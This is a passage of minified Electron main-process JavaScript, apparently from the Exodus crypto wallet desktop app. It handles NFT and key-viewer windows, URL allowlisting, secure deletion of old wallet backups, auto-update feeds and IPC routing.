        const { session: e } = m.webContents;
        e.protocol.registerStringProtocol("exodus-nfts-api", (e, t) => {
          try {
            const t = new s.URL(e.url).searchParams.get("data");
            if (!t) throw new Error("No message found in nfts IPC request!");
            d.appWindows.ui.webContents.send("exodus-nfts-api", { messageString: t });
          } catch (e) {
            console.error("Could not parse exodus-nfts-api request!"), console.error(e);
          }
          t({ mimeType: "text/plain", data: "ok" });
        }),
          c.ENV_DEV && Object(h.showDevTools)(m),
          await m.webContents.loadFile(f.WINDOW_NFTS),
          m.webContents.debugger.attach("1.3"),
          m.webContents.on("devtools-reload-page", () => {
            Object(u.targeted)("ui", "nfts-reload");
          });
      }),
      u.rpcMain.handle("nfts:showDevTools", async () => {
        Object(h.showDevTools)(m);
      }),
      u.rpcMain.handle("nfts:show", () => {
        d.appWindows.background.addBrowserView(m), d.appWindows.background.setTopBrowserView(d.appWindows.ui), Object(h.updateViewBounds)(m, y), Object(h.refocusView)(m);
      }),
      u.rpcMain.handle("nfts:hide", () => {
        b();
      }),
      u.rpcMain.handle("nfts:goBack", () => {
        const e = m.webContents.canGoBack();
        return e && m.webContents.goBack(), e;
      }),
      u.rpcMain.handle("nfts:api-receive", async (e, { dataString: t }) => {
        const n = JSON.stringify(JSON.parse(t));
        await m.webContents.executeJavaScript(`window._exodus_nfts_api.receive(${r()(n)}),0`);
      }),
      u.rpcMain.on("nfts:pointer", (e, t) => {
        const n = Object(h.toInputEvent)(t);
        n && (["mousedown", "click"].includes(t.type) && m.webContents.focus(), m.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n));
      });
  },
  function (e, t, n) {
    "use strict";
    var o = n(1),
      r = n(23),
      i = n(3),
      s = n(74);
    t.default = (e, t) => {
      if (i.appWindows.background.webContents.zoomFactor === e) return;
      const n = o.MIN_WIDTH * e,
        c = o.MIN_HEIGHT * e;
      i.appWindows.background.setMinimumSize(n, c);
      const [a, u] = i.appWindows.background.getSize();
      return (
        (t || a < n || u < c) &&
          ((e, t) => {
            try {
              i.appWindows.background.setSize(e, t, !1);
            } catch (e) {
              console.error("failed to update window size", e);
            }
          })(n, c),
        Object(r.allWebContents)().forEach((t) => {
          (t.zoomFactor = e), Object(s.updateNftsViewBounds)();
        }),
        e
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var o = n(1);
    const r = !o.ENV_PROD,
      i = [
        "file-system",
        "notifications",
        "presentation-api",
        "speech-api",
        "pepper-3d",
        "shared-workers",
        [
          "blink-features",
          ["FileSystem", "MediaSession", "Serial", "WebAuth", "WebBluetooth", "WebHID", "WebNFC", "WebOTP", "WebUSB", "WebXR", "WebScheduler", "WindowPlacement", "WindowSegments"].join(","),
        ],
        ["features", ["Reporting", "WebAuthentication", "WebGPUService", "WebNFC", "WebOTP", "WebPermissionsApi", "WebUSB", "WebXR"].join(",")],
      ];
    t.default = [...[], ...(r || o.ENV_BUILD_EDEN, []), ...i];
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "init", function () {
      return w;
    });
    var o = n(0),
      r = n(22),
      i = n(17),
      s = n(8),
      c = n(10),
      a = n(13),
      u = n(5),
      l = n(7),
      d = n(18);
    const f = {
      transparent: !0,
      width: 850,
      height: 500,
      show: !0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !1,
      title: "Scan QR Code",
      webPreferences: { ...l.isolation, partition: "scan-qr" },
      frame: !1,
    };
    let p,
      h = !1;
    function w(e, t, n) {
      if ((console.log(`[app-run] EVENT wallet:qrCodeScan: payload = ${n && JSON.stringify(n)}`), !n || n.assetName))
        if (p) p.send("wallet:qr:changeState", n), p.show(), e.hide();
        else {
          if (h) return;
          (h = !0),
            (function (e, t, n) {
              const l = new o.BrowserWindow(f);
              Object(s.registerWebContents)(l.webContents, "scan-qr"),
                Object(a.forwardErrors)(l.webContents, "scan-qr"),
                l.loadURL(Object(d.getHtmlUrl)({ app: o.app, filePath: u.WINDOW_SCAN_QR, hash: Object(r.encode)(e) })),
                Object(i.default)() && (Object(c.default)({ windowHandle: l.webContents, windowId: "scanQR" }), (l.webContents.zoomFactor = n.webContents.zoomFactor), l.show());
              let p = !1;
              return (
                o.app.on("before-quit", () => {
                  (p = !0), l.isDestroyed() || l.close();
                }),
                l.on("close", (e) => {
                  p || (e.preventDefault(), l.hide());
                }),
                new Promise((e, t) => {
                  l.webContents.once("dom-ready", () => {
                    l.show(), e(l);
                  });
                })
              );
            })(n, 0, t).then((t) => {
              (p = t),
                e.hide(),
                t.on("close", () => {
                  e.show();
                }),
                (h = !1);
            });
        }
      else
        n && n.qrData
          ? (p.hide(), e.show(), console.log(`[app-run] QR code decoded: ${n.qrData}`), t.webContents.send("wallet:qrCodeValue", n.qrData))
          : n.error && (console.log(`[app-run] QR scan window error: ${n.error}`), p.hide(), e.show());
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "init", function () {
      return h;
    });
    var o = n(0),
      r = n(22),
      i = n(17),
      s = n(8),
      c = n(10),
      a = n(5),
      u = n(7),
      l = n(18);
    const d = {
      ...u.default,
      backgroundColor: "#FFFFFF",
      fullscreen: !1,
      fullscreenable: !1,
      width: 900,
      height: 500,
      show: !1,
      title: "PRIVATE KEYS",
      minimizable: !1,
      maximizable: !1,
      alwaysOnTop: !0,
      webPreferences: { ...u.isolation, partition: "keyviewer" },
      modal: !0,
    };
    let f = null;
    let p = 0;
    function h(e, t, n) {
      return (
        (d.webPreferences.partition = `keyviewer-${p++}`),
        (f = new o.BrowserWindow({ ...d, parent: e })),
        Object(s.registerWebContents)(f.webContents, "keyviewer"),
        f.loadURL(Object(l.getHtmlUrl)({ app: o.app, hash: Object(r.encode)(n), filePath: a.WINDOW_KEYVIEWER })),
        Object(i.default)() && Object(c.default)({ windowHandle: f.webContents, windowId: "keyviewer" }),
        f.on("close", (e) => {
          setImmediate(() => {
            f.destroy();
          });
        }),
        f.webContents.once("dom-ready", () => {
          (f.webContents.zoomFactor = t.webContents.zoomFactor), f.show();
        }),
        f
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "validate", function () {
      return s;
    });
    const o = [
        /^https:\/\/support\.exodus\.(io|com)\/[a-zA-Z0-9/_-]*(#[a-zA-Z0-9%_-]+)?$/,
        /^https:\/\/www\.exodus\.com\/support(\/[a-zA-Z0-9/_-]*)?(#[a-zA-Z0-9%_-]+)?$/,
        /^https:\/\/etherscan\.io\/tx\/0x[a-zA-Z0-9]+$/,
        /^https:\/\/polygonscan\.com\/tx\/0x[a-zA-Z0-9]+$/,
        /^https:\/\/youtu\.be\/jRLOG8fLwuA$/,
      ],
      r = [/^support@exodus\.(io|com)$/];
    function i(e, t) {
      return "string" == typeof e ? e === t : e.test(t);
    }
    function s(e) {
      if ("string" != typeof e) return !1;
      let t;
      try {
        t = new URL(e);
      } catch (e) {
        return !1;
      }
      if (t.href !== e) return !1;
      if (!e.startsWith(t.protocol)) return !1;
      switch (t.protocol) {
        case "mailto:":
          if (e !== `mailto:${t.pathname}${t.search}`) return !1;
          if (t.search) {
            if (
              ![
                `?${t.searchParams}`,
                `?${(function (e) {
                  const t = [];
                  for (const [n, o] of e) t.push(`${encodeURIComponent(n)}=${encodeURIComponent(o)}`);
                  return t.join("&");
                })(t.searchParams)}`,
              ].includes(t.search)
            )
              return !1;
            const e = new Set(["subject", "body"]);
            for (const [n] of t.searchParams) if (!e.has(n)) return !1;
          }
          return r.some((e) => i(e, t.pathname));
        case "https:":
          return o.some((t) => i(t, e));
      }
      return !1;
    }
  },
  function (e, t) {
    e.exports = require("events");
  },
  function (e, t, n) {
    const o = n(91),
      { randomBytes: r } = n(60);
    e.exports = async function (e, t = {}) {
      let n, i;
      const s = Buffer.alloc(16384);
      try {
        const c = await o.stat(e);
        if (!c.isFile()) throw new Error(`${e} is not file`);
        let a = c.size;
        if (t.size) {
          const e = t.size.toString().match(/^(\d+)([KMG]?)$/);
          if (null === e) throw new Error(`invalid size: ${t.size}`);
          a = parseInt(e[1], 10) * ("K" === e[2] ? 1024 : "M" === e[2] ? 1048576 : "G" === e[2] ? 1073741824 : 1);
        }
        let u = 3;
        if (t.iterations) {
          if (null === t.iterations.toString().match(/^\d+$/)) throw new Error(`invalid iterations: ${t.iterations}`);
          u = parseInt(t.iterations, 10);
        }
        if (!(u >= 1)) throw new Error(`invalid iterations: ${t.iterations}`);
        if ((t.zero && (u -= 1), (n = await o.open(e, "w")), t.randomSource)) {
          i = await o.open(t.randomSource, "r");
          let e = 0;
          for (let o = 0, r = 0; o < u; ++o)
            for (; r < a; ) {
              const o = Math.min(s.length, a - r),
                { bytesRead: c } = await i.read(s, 0, o, e);
              if (0 === c) throw new Error(`not enough data in ${t.randomSource}`);
              e += c;
              const { bytesWritten: u } = await n.write(s, 0, c, r);
              if (u !== c) throw new Error("lost data on overwrite");
              r += c;
            }
          await i.close(), (i = void 0);
        } else
          for (let e = 0; e < u; ++e)
            for (let e = 0; e < a; ) {
              const t = Math.min(16384, a - e),
                o = r(t),
                { bytesWritten: i } = await n.write(o, 0, t, e);
              if (i !== t) throw new Error("lost data on overwrite");
              e += t;
            }
        if (t.zero) {
          s.fill(0);
          for (let e = 0; e < a; ) {
            const t = Math.min(s.length, a - e),
              { bytesWritten: o } = await n.write(s, 0, t, e);
            if (o !== t) throw new Error("lost data on overwrite");
            e += t;
          }
        }
        await n.close(), (n = void 0), t.remove && (await o.unlink(e));
      } catch (e) {
        throw (await Promise.all([n, i].filter((e) => !!e).map((e) => e.close().catch(() => {}))).catch(() => {}), e);
      }
    };
  },
  function (e, t, n) {
    "use strict";
    var o = n(9),
      r = n.n(o),
      i = n(53),
      s = n.n(i),
      c = n(2),
      a = n.n(c),
      u = n(81),
      l = n.n(u),
      d = n(29);
    t.default = async function () {
      const e = Object(d.walletBackupDir)();
      let t;
      try {
        t = await r.a.readdir(e);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw e;
      }
      const n = Date.now() - s()("90 days"),
        o = t.filter((e) => new Date(e.split("_")[0]).getTime() < n).map((t) => a.a.resolve(e, t));
      if (!o.length) return;
      const i = { iterations: 1 };
      await Promise.all(
        o.map((e) =>
          (async function (e, t) {
            const n = await r.a.readdir(e);
            return Promise.all(n.map((n) => l()(a.a.join(e, n), t)));
          })(a.a.join(e, "exodus.wallet"), i)
        )
      ),
        await Promise.all(o.map((e) => r.a.remove(e)));
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getAutoUpdateUrls", function () {
      return s;
    });
    var o = n(41),
      r = n.n(o),
      i = n(1);
    const s = (e) => {
      const t = e ? `feed-${e}` : "feed";
      return {
        darwin: r()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin.json`),
        darwinArm: r()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin-arm64.json`),
        linux: r()(i.AUTO_UPDATE_BASE_URL, `${t}/linux-${process.arch}.json`),
        win32: r()(i.AUTO_UPDATE_BASE_URL, `${t}/win32-${process.arch}`),
      };
    };
  },
  function (e, t) {
    function n(e) {
      if (!(this instanceof n)) return new n(e);
      this.value = e;
    }
    function o(e, t, n) {
      var o = [],
        i = [],
        s = !0;
      return (function e(c) {
        var a = n ? r(c) : c,
          u = {},
          l = {
            node: a,
            node_: c,
            path: [].concat(o),
            parent: i.slice(-1)[0],
            key: o.slice(-1)[0],
            isRoot: 0 === o.length,
            level: o.length,
            circular: null,
            update: function (e) {
              l.isRoot || (l.parent.node[l.key] = e), (l.node = e);
            },
            delete: function () {
              delete l.parent.node[l.key];
            },
            remove: function () {
              Array.isArray(l.parent.node) ? l.parent.node.splice(l.key, 1) : delete l.parent.node[l.key];
            },
            before: function (e) {
              u.before = e;
            },
            after: function (e) {
              u.after = e;
            },
            pre: function (e) {
              u.pre = e;
            },
            post: function (e) {
              u.post = e;
            },
            stop: function () {
              s = !1;
            },
          };
        if (!s) return l;
        if ("object" == typeof a && null !== a) {
          l.isLeaf = 0 == Object.keys(a).length;
          for (var d = 0; d < i.length; d++)
            if (i[d].node_ === c) {
              l.circular = i[d];
              break;
            }
        } else l.isLeaf = !0;
        (l.notLeaf = !l.isLeaf), (l.notRoot = !l.isRoot);
        var f = t.call(l, l.node);
        if ((void 0 !== f && l.update && l.update(f), u.before && u.before.call(l, l.node), "object" == typeof l.node && null !== l.node && !l.circular)) {
          i.push(l);
          var p = Object.keys(l.node);
          p.forEach(function (t, r) {
            o.push(t), u.pre && u.pre.call(l, l.node[t], t);
            var i = e(l.node[t]);
            n && Object.hasOwnProperty.call(l.node, t) && (l.node[t] = i.node), (i.isLast = r == p.length - 1), (i.isFirst = 0 == r), u.post && u.post.call(l, i), o.pop();
          }),
            i.pop();
        }
        return u.after && u.after.call(l, l.node), l;
      })(e).node;
    }
    function r(e) {
      var t;
      return "object" == typeof e && null !== e
        ? ((t = Array.isArray(e)
            ? []
            : e instanceof Date
            ? new Date(e)
            : e instanceof Boolean
            ? new Boolean(e)
            : e instanceof Number
            ? new Number(e)
            : e instanceof String
            ? new String(e)
            : Object.create(Object.getPrototypeOf(e))),
          Object.keys(e).forEach(function (n) {
            t[n] = e[n];
          }),
          t)
        : e;
    }
    (e.exports = n),
      (n.prototype.get = function (e) {
        for (var t = this.value, n = 0; n < e.length; n++) {
          var o = e[n];
          if (!Object.hasOwnProperty.call(t, o)) {
            t = void 0;
            break;
          }
          t = t[o];
        }
        return t;
      }),
      (n.prototype.set = function (e, t) {
        for (var n = this.value, o = 0; o < e.length - 1; o++) {
          var r = e[o];
          Object.hasOwnProperty.call(n, r) || (n[r] = {}), (n = n[r]);
        }
        return (n[e[o]] = t), t;
      }),
      (n.prototype.map = function (e) {
        return o(this.value, e, !0);
      }),
      (n.prototype.forEach = function (e) {
        return (this.value = o(this.value, e, !1)), this.value;
      }),
      (n.prototype.reduce = function (e, t) {
        var n = 1 === arguments.length,
          o = n ? this.value : t;
        return (
          this.forEach(function (t) {
            (this.isRoot && n) || (o = e.call(this, o, t));
          }),
          o
        );
      }),
      (n.prototype.deepEqual = function (e) {
        if (1 !== arguments.length) throw new Error("deepEqual requires exactly one object to compare against");
        var t = !0,
          o = e;
        return (
          this.forEach(function (r) {
            var i = function () {
              t = !1;
            }.bind(this);
            if (!this.isRoot) {
              if ("object" != typeof o) return i();
              o = o[this.key];
            }
            var s = o;
            this.post(function () {
              o = s;
            });
            var c = function (e) {
              return Object.prototype.toString.call(e);
            };
            if (this.circular) n(e).get(this.circular.path) !== s && i();
            else if (typeof s != typeof r) i();
            else if (null === s || null === r || void 0 === s || void 0 === r) s !== r && i();
            else if (s.__proto__ !== r.__proto__) i();
            else if (s === r);
            else if ("function" == typeof s) s instanceof RegExp ? s.toString() != r.toString() && i() : s !== r && i();
            else if ("object" == typeof s)
              if ("[object Arguments]" === c(r) || "[object Arguments]" === c(s)) c(s) !== c(r) && i();
              else if (s instanceof Date || r instanceof Date) (s instanceof Date && r instanceof Date && s.getTime() === r.getTime()) || i();
              else {
                var a = Object.keys(s),
                  u = Object.keys(r);
                if (a.length !== u.length) return i();
                for (var l = 0; l < a.length; l++) {
                  var d = a[l];
                  Object.hasOwnProperty.call(r, d) || i();
                }
              }
          }),
          t
        );
      }),
      (n.prototype.paths = function () {
        var e = [];
        return (
          this.forEach(function (t) {
            e.push(this.path);
          }),
          e
        );
      }),
      (n.prototype.nodes = function () {
        var e = [];
        return (
          this.forEach(function (t) {
            e.push(this.node);
          }),
          e
        );
      }),
      (n.prototype.clone = function () {
        var e = [],
          t = [];
        return (function n(o) {
          for (var i = 0; i < e.length; i++) if (e[i] === o) return t[i];
          if ("object" == typeof o && null !== o) {
            var s = r(o);
            return (
              e.push(o),
              t.push(s),
              Object.keys(o).forEach(function (e) {
                s[e] = n(o[e]);
              }),
              e.pop(),
              t.pop(),
              s
            );
          }
          return o;
        })(this.value);
      }),
      Object.keys(n.prototype).forEach(function (e) {
        n[e] = function (t) {
          var o = [].slice.call(arguments, 1),
            r = n(t);
          return r[e].apply(r, o);
        };
      });
  },
  function (e, t, n) {
    "use strict";
    var o = n(84),
      r = n.n(o);
    t.default = (e) =>
      void 0 === globalThis.Buffer
        ? e
        : (r()(e).forEach(function (e) {
            e instanceof Uint8Array && this.update(globalThis.Buffer.from(e));
          }),
          e);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "wrapIpc", function () {
      return c;
    });
    var o = n(85);
    const r = new WeakMap(),
      i = new WeakMap();
    function s(e, t, n) {
      const s = i.get(e);
      if (s && (s.filter !== t || s.useBuffers !== n)) throw new Error("Attempting to register the same handler with different parameters");
      i.set(e, { filter: t, useBuffers: n });
      const c = r.get(e);
      if (c) return c;
      const a = (r, ...i) => {
        if (!0 !== t(r)) return;
        const s = n ? Object(o.default)(i) : i;
        return e(r, ...s);
      };
      return r.set(e, a), a;
    }
    function c(e, t) {
      return {
        on(n, o, r = !0) {
          e.on(n, s(o, t, r));
        },
        once(n, o, r = !0) {
          e.once(n, s(o, t, r));
        },
        removeListener(t, n) {
          e.removeListener(t, r.get(n));
        },
        removeAllListeners(t) {
          e.removeAllListeners(t);
        },
        handle(n, o, r = !0) {
          e.handle(n, s(o, t, r));
        },
        removeHandler(t) {
          e.removeHandler(t);
        },
        send(...t) {
          e.send(...t);
        },
        sendSync: (...t) => e.sendSync(...t),
        invoke: (...t) => e.invoke(...t),
      };
    }
  },
  function (e, t) {
    function n(e) {
      return e instanceof Error ? { ...e, name: e.name, message: e.message, stack: o(e.stack) } : { name: e.name || "UNKNOWN", message: JSON.stringify(e) };
    }
    function o(e) {
      return e
        .replace(/\/Users\/[^/]+/g, "")
        .replace(/\\Users\\[^\\]+/g, "")
        .replace(/\/home\/[^/]+/g, "");
    }
    e.exports = {
      toObject: n,
      JSONReplacer: function (e, t) {
        return t instanceof Error ? n(t) : t;
      },
      cleanStack: o,
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "createServerImplementation", function () {
      return i;
    });
    var o = n(87),
      r = n(65);
    function i(e, t, n, i, s, c, { wrap: a, unwrap: u } = {}) {
      const l = `${r.CHANNEL_PREFIX}:${i}:call`,
        d = async (e, l) => {
          const d = n(e, l);
          if (!s.includes(d)) return void console.error(`Skipping unexpected message from (${d}) to channel: ${i}`);
          const { func: f, args: p, token: h } = l.payload,
            [w, m] = await (async function (e, t) {
              if ("function" == typeof c[e])
                try {
                  u && (t = u(e, t));
                  let n = await c[e](...t);
                  return a && (n = a(e, n)), [null, n];
                } catch (e) {
                  return [e, null];
                }
              try {
                return [null, c[e]];
              } catch (e) {
                return [e];
              }
            })(f, p),
            b = w ? Object(o.toObject)(w) : null;
          t(d, `${r.CHANNEL_PREFIX}:${i}:response:${h}`, [b, m]);
        };
      return e.on(l, d), { stop: () => e.removeListener(l, d) };
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "prepareMetaEntry", function () {
      return r;
    });
    var o = n(66);
    function r(e, { url: t, domains: n, ...r }) {
      if (Object.keys(r).length > 0) throw new Error("Unexpected argument");
      if (!o.meta.has(e)) throw new Error(`Unknown webContents type: '${e}'`);
      const i = { ...o.meta.get(e) };
      if (i.parallel && !i.multiple) throw new Error("`parallel: true` requires `multiple: true`");
      if (i.parallel && i.persistent) throw new Error("Can not use persistent session in parallel");
      if (i.parallel && i.ipc) throw new Error("To support targeted IPC handling, webContents could not be .parallel");
      if (i.hasOwnProperty("reusable")) throw new Error("Entry shouldn't have a .reusable property");
      if (((i.reusable = i.persistent && i.multiple), i.offline)) {
        if (i.domains || n) throw new Error(`Domains can not be specified for offline ${e}`);
        if (i.protocols.length > 1 || "file:" !== i.protocols[0]) throw new Error(`Offline session can use only file: protocol for ${e}`);
        i.domains = [];
      } else {
        if (!!i.domains == !!n) throw new Error(`Domains argument (un)expected for '${e}'`);
        i.domains || (i.domains = n);
      }
      if (!!i.url == !!t) throw new Error(`Url argument (un)expected for '${e}'`);
      if ((i.url || (i.url = t), i.hasOwnProperty("type"))) throw new Error("Entry shouldn't have a .type property");
      return (i.type = e), (i.flags = new Set(i.flags || [])), Object.freeze(i), i;
    }
  },
  function (e) {
    e.exports = [
      "about",
      "close",
      "copy",
      "cut",
      "delete",
      "front",
      "help",
      "hide",
      "hideothers",
      "minimize",
      "paste",
      "pasteandmatchstyle",
      "quit",
      "redo",
      "resetzoom",
      "selectall",
      "services",
      "startspeaking",
      "stopspeaking",
      "togglefullscreen",
      "undo",
      "unhide",
      "window",
      "zoom",
      "zoomin",
      "zoomout",
    ];
  },
  function (e, t) {
    e.exports = require("fs/promises");
  },
  function (e, t, n) {
    "use strict";
    var o = n(4),
      r = n(20),
      i = n.n(r);
    Object(o.createServer)("metrics-controller", ["ui"], { getTimeOrigin: i.a.getTimeOrigin, getTrace: i.a.getTrace });
  },
  function (e, t, n) {
    "use strict";
    var o = n(4),
      r = n(33);
    let i,
      s = null,
      c = 0;
    const a = {
      requestHide() {
        i({ status: s || "cancel", attempts: c });
      },
      async unlock() {
        const e = Object(r.getWindow)();
        return new Promise((t) => {
          (s = null), (i = t), e.show(), setImmediate(() => e.send("unlock:show"));
        });
      },
      async closeUnlockWindow() {
        const e = Object(r.getWindow)();
        e.hide(), setImmediate(() => e.send("unlock:hide"));
      },
      async setStatus(e, t) {
        (s = e), (c = t);
      },
    };
    Object(o.createServer)("unlock-controller", ["unlock", "ui"], a);
  },
  function (e, t, n) {
    "use strict";
    var o = n(52),
      r = n.n(o),
      i = n(0),
      s = n(32),
      c = n.n(s),
      a = n(43),
      u = n(83),
      l = n(4);
    const d = Object(a.promisify)(r.a.execFile),
      f = {
        async startUpdate(e) {
          const t = Object(u.getAutoUpdateUrls)(e);
          let n = t[process.platform];
          if ("darwin" === process.platform)
            ("arm64" === process.arch ||
              (await (async function () {
                if ("darwin" === process.platform && "x64" === process.arch) {
                  const [e, t] = c.a.release().split(".").map(Number);
                  if (e > 20 || (20 === e && t >= 5))
                    try {
                      const { stdout: e, stderr: t } = await d("sysctl", ["sysctl.proc_translated"]);
                      return "sysctl.proc_translated: 1" === e.trim() && "" === t.trim();
                    } catch {
                      return !1;
                    }
                }
                return !1;
              })())) &&
              (n = t.darwinArm);
          else if ("linux" === process.platform) throw new Error("autoUpdate unsupported for linux");
          return new Promise((e, t) => {
            i.autoUpdater.on("error", (e) => {
              console.error(`Update error: ${e.message}`), t(e);
            }),
              i.autoUpdater.on("checking-for-update", () => console.log("Checking for update")),
              i.autoUpdater.on("update-available", () => console.log("Update available")),
              i.autoUpdater.on("update-not-available", () => console.log("No update available")),
              i.autoUpdater.on("update-downloaded", (t, n, o, r, i) => {
                console.log(`Update downloaded: ${o}: ${i}`), e();
              }),
              i.autoUpdater.setFeedURL(n),
              i.autoUpdater.checkForUpdates();
          });
        },
        quitAndInstall() {
          i.autoUpdater.quitAndInstall();
        },
      };
    Object(l.createServer)("auto-update-controller", ["ui"], f);
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "mainBroadcastListener", function () {
        return p;
      }),
      n.d(t, "targeted", function () {
        return h;
      }),
      n.d(t, "broadcast", function () {
        return w;
      }),
      n.d(t, "rpcMain", function () {
        return O;
      }),
      n.d(t, "rpcListener", function () {
        return S;
      }),
      n.d(t, "createServer", function () {
        return D;
      });
    var o = n(0),
      r = n(1),
      i = n(6),
      s = n(88),
      c = n(42),
      a = n(86);
    const u = Object(a.wrapIpc)(o.ipcMain, function (e) {
      return !!Object(c.getIpcType)(e.sender) || (Object(i.showError)("send to IPC from non-whitelisted webContents"), !1);
    });
    let l = !1;
    async function d(e, t, n, o) {
      if (!o) throw new Error("Can not send without origin!");
      await (function (e) {
        return new Promise((t) => {
          if (!e.isLoading()) return t();
          e.once("did-finish-load", t),
            setImmediate(() => {
              e.isLoading() || (e.removeListener("did-finish-load", t), t(), l || ((l = !0), console.log("Caught and prevented a race condition in RPC awaitLoad()")));
            });
        });
      })(e),
        e.send(t, { channel: t, payload: n, origin: o });
    }
    function f(e, t, n, o) {
      if ("#" === e) throw new Error("Can not send to self");
      if (!o || !e) throw new Error("Can not send without target and origin");
      const s = Object(c.findWebContents)(e);
      0 === s.length ? r.ENV_DEV && console.log(`[ipc]: (${o} -> ${e}) 0 processes to send to on "${t}"`) : s.length > 1 && r.ENV_DEV && Object(i.showError)("targeted send to multiple webContents"),
        s.forEach((e) => d(e, t, n, o));
    }
    function p() {
      u.on(
        "ipc:target:send",
        (e, { target: t, channel: n, payload: o }) => {
          f(t, n, o, Object(c.getIpcType)(e.sender));
        },
        !1
      );
    }
    function h(e, t, n) {
      f(e, t, n, "#");
    }
    function w(e, t) {
      !(function (e, t, n) {
        Object(c.allIpcWebContents)().forEach(({ contents: o }) => d(o, e, t, n));
      })(e, t, "#");
    }
    const { on: m, once: b, removeListener: y, removeAllListeners: g, handle: E, removeHandler: v } = u,
      O = { on: m, once: b, removeListener: y, removeAllListeners: g, handle: E, removeHandler: v },
      S = O;
    function D(...e) {
      return Object(s.createServerImplementation)(u, h, (e) => Object(c.getIpcType)(e.sender), ...e);
    }
  },
  function (e, t, n) {
    "use strict";
    var o = n(60),
      r = n.n(o),
      i = n(0),
      s = n(32),
      c = n.n(s),
      a = n(4),
      u = n(19),
      l = n(8),
      d = n(79),
      f = n(3),
      p = n(63),
      h = n.n(p),
      w = n(78),
      m = n(77);
    a.rpcMain.on("keyviewer-process:init", (e, t) => {
      f.appWindows.keyviewer ||
        ((f.appWindows.keyviewer = Object(w.init)(f.appWindows.background, f.appWindows.ui, t)),
        f.appWindows.keyviewer.webContents.once("dom-ready", () => {
          e.sender.send("keyviewer-process:opened");
        }),
        f.appWindows.keyviewer.once("closed", () => {
          delete f.appWindows.keyviewer;
        }));
    }),
      a.rpcMain.on("keyviewer-process:close", (e, t) => {
        f.appWindows.keyviewer.hide(), f.appWindows.keyviewer.destroy();
      }),
      a.rpcMain.on("wallet:qrCodeScan", (e, t) => {
        Object(m.init)(f.appWindows.background, f.appWindows.ui, t);
      }),
      a.rpcMain.on("ui:set-navbar-height", (e, t) => {
        for (const e of u.navbarHeightChangeHandlers) e(t.navbarHeight);
      }),
      a.rpcMain.handle("has-media-access", async (e, t) => {
        if ("camera" === t) {
          if (!("darwin" === process.platform && Number(c.a.release().split(".")[0]) >= 18)) return !0;
        }
        return "granted" === i.systemPreferences.getMediaAccessStatus(t) || i.systemPreferences.askForMediaAccess(t);
      }),
      a.rpcMain.handle("openExternal", async (e, t) => {
        if (!Object(d.validate)(t)) throw new Error("Navigation request declined");
        await i.shell.openExternal(t, { activate: !0 });
      }),
      a.rpcMain.handle("openExternal:unchecked", async (e, t) => {
        const { permissions: n = [] } = Object(l.getWebContentsMeta)(e.sender);
        if (!n.includes("openExternal")) throw new Error("Do not have openExternal permission");
        await i.shell.openExternal(t, { activate: !0 });
      }),
      a.rpcMain.handle("get-machine-id", async () => {
        const e = c.a.networkInterfaces();
        for (const [t, n] of Object.entries(e)) {
          if (t.startsWith("lo") || t.startsWith("Loopback")) continue;
          const e = n.find((e) => e.address && e.mac && "IPv4" === e.family);
          if (e) {
            const t = r.a.createHash("sha256");
            return t.update(e.mac), t.digest("hex");
          }
        }
      }),
      a.rpcMain.handle("dialog:open", (e, t) => {
        const n = i.BrowserWindow.getFocusedWindow();
        return i.dialog.showOpenDialog(n, t);
      });
    for (const [e, t] of h.a.on) a.rpcMain.on(e, t);
    for (const [e, t] of h.a.handle) a.rpcMain.handle(e, t);
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    n(96);
    var o = n(0),
      r = n(2),
      i = n.n(r),
      s = n(14),
      c = n(1),
      a = n(4),
      u = n(20),
      l = n.n(u),
      d = n(76),
      f = n(55),
      p = n(3),
      h = n(25),
      w = n(70),
      m = n(54),
      b = n(40);
    c.ENV_BUILD_EDEN && o.app.setName("Eden"),
      o.app.commandLine.appendSwitch("disable-renderer-backgrounding"),
      o.app.commandLine.appendSwitch("autoplay-policy", "no-user-gesture-required"),
      process.env.EXODUS_DISABLE_GPU && o.app.disableHardwareAcceleration();
    for (const e of d.default) Array.isArray(e) ? o.app.commandLine.appendSwitch(`disable-${e[0]}`, e[1]) : o.app.commandLine.appendSwitch(`disable-${e}`);
    process.env.ELECTRON_FORCE_WINDOW_MENU_BAR = !0;
    const y = n(44)(process.argv);
    !(function () {
      if (c.ENV_TEST) console.log("TEST MODE");
      else {
        const e = ["_", "datadir", "debug", "disable-gpu", "p"];
        (!Object.keys(y).every((t) => e.includes(t)) || y._.length > 2) && (console.error("Can only pass whitelisted args; exiting", JSON.stringify(y)), o.app.exit());
      }
    })(),
      y.datadir ? o.app.setPath("userData", i.a.resolve(y.datadir)) : c.ENV_BUILD_EDEN && o.app.setPath("userData", i.a.join(o.app.getPath("appData"), "Exodus Eden")),
      y._.length > 1 && (globalThis.OPENED_URL = y._[1]);
    const g = new RegExp(`^${c.PROTOCOL}://securitize`),
      E = (e) => g.test(e),
      v = (e) => {
        const { pathname: t, searchParams: n } = new s.URL(e);
        return { path: t.slice(1), params: Object.fromEntries(n.entries()) };
      };
    function O(e) {
      if (!e || !E(e)) return;
      const { path: t, params: n } = v(e);
      p.appWindows.ui.webContents.send("securitize:data", { path: t, params: n });
    }
    function S(e, t) {
      e.preventDefault(), console.log("OPEN URL: " + t), (globalThis.OPENED_URL = t), O(t), Object(m.maybeDeepLink)(t);
    }
    o.app.on("open-file", S),
      o.app.on("open-url", S),
      a.rpcMain.on("securitize:fetch-data", () => {
        O(globalThis.OPENED_URL);
      }),
      a.rpcMain.on("securitize:fake-deep-link", (e, t) => {
        O(`${c.PROTOCOL}://securitize?${new URLSearchParams(t)}`);
      }),
      a.rpcMain.on("window:focus", () => {
        console.log("received window:focus request"), p.appWindows.background.show();
      }),
      a.rpcMain.on("window:fetchIsFocused", () => {
